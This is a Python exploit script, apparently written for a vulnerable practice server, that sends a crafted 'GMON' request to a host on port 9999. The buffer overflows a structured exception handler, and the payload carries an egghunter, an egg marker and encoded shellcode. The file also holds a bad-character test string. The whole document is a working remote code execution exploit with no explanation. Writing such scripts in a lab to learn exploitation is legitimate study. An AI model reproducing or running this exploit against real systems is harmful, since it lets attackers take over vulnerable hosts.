#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.218"
port = 9999

seh="\xb4\x10\x50\x62"
nseh="\xeb\x80\x90\x90"


egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x6d\x65\x64\x75\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egg= "medumedu"
shellcode =("\xba\xa9\x09\x9c\xdf\xdb\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x6f\x0d\x7e\x2a\x93\xe6\xfc"
"\xd5\x6b\xf7\x60\x5f\x8e\xc6\xa0\x3b\xdb\x79\x11\x4f\x89\x75"
"\xda\x1d\x39\x0d\xae\x89\x4e\xa6\x05\xec\x61\x37\x35\xcc\xe0"
"\xbb\x44\x01\xc2\x82\x86\x54\x03\xc2\xfb\x95\x51\x9b\x70\x0b"
"\x45\xa8\xcd\x90\xee\xe2\xc0\x90\x13\xb2\xe3\xb1\x82\xc8\xbd"
"\x11\x25\x1c\xb6\x1b\x3d\x41\xf3\xd2\xb6\xb1\x8f\xe4\x1e\x88"
"\x70\x4a\x5f\x24\x83\x92\x98\x83\x7c\xe1\xd0\xf7\x01\xf2\x27"
"\x85\xdd\x77\xb3\x2d\x95\x20\x1f\xcf\x7a\xb6\xd4\xc3\x37\xbc"
"\xb2\xc7\xc6\x11\xc9\xfc\x43\x94\x1d\x75\x17\xb3\xb9\xdd\xc3"
"\xda\x98\xbb\xa2\xe3\xfa\x63\x1a\x46\x71\x89\x4f\xfb\xd8\xc6"
"\xbc\x36\xe2\x16\xab\x41\x91\x24\x74\xfa\x3d\x05\xfd\x24\xba"
"\x6a\xd4\x91\x54\x95\xd7\xe1\x7d\x52\x83\xb1\x15\x73\xac\x59"
"\xe5\x7c\x79\xcd\xb5\xd2\xd2\xae\x65\x93\x82\x46\x6f\x1c\xfc"
"\x77\x90\xf6\x95\x12\x6b\x91\x59\x4a\x72\xda\x32\x89\x74\x18"
"\x11\x04\x92\x4a\x85\x41\x0d\xe3\x3c\xc8\xc5\x92\xc1\xc6\xa0"
"\x95\x4a\xe5\x55\x5b\xbb\x80\x45\x0c\x4b\xdf\x37\x9b\x54\xf5"
"\x5f\x47\xc6\x92\x9f\x0e\xfb\x0c\xc8\x47\xcd\x44\x9c\x75\x74"
"\xff\x82\x87\xe0\x38\x06\x5c\xd1\xc7\x87\x11\x6d\xec\x97\xef"
"\x6e\xa8\xc3\xbf\x38\x66\xbd\x79\x93\xc8\x17\xd0\x48\x83\xff"
"\xa5\xa2\x14\x79\xaa\xee\xe2\x65\x1b\x47\xb3\x9a\x94\x0f\x33"
"\xe3\xc8\xaf\xbc\x3e\x49\xcf\x5e\xea\xa4\x78\xc7\x7f\x05\xe5"
"\xf8\xaa\x4a\x10\x7b\x5e\x33\xe7\x63\x2b\x36\xa3\x23\xc0\x4a"
"\xbc\xc1\xe6\xf9\xbd\xc3")

#badchar= '\x00'
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68"
"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
"\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buffer="A"*3389
buffer+=egghunter
buffer+="A"*(3515-len(buffer))
buffer+=nseh
buffer+=seh
buffer+=egg
buffer+=shellcode
buffer+="D"*(5011-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.:/" + buffer)
print s.recv(1024)
s.close()

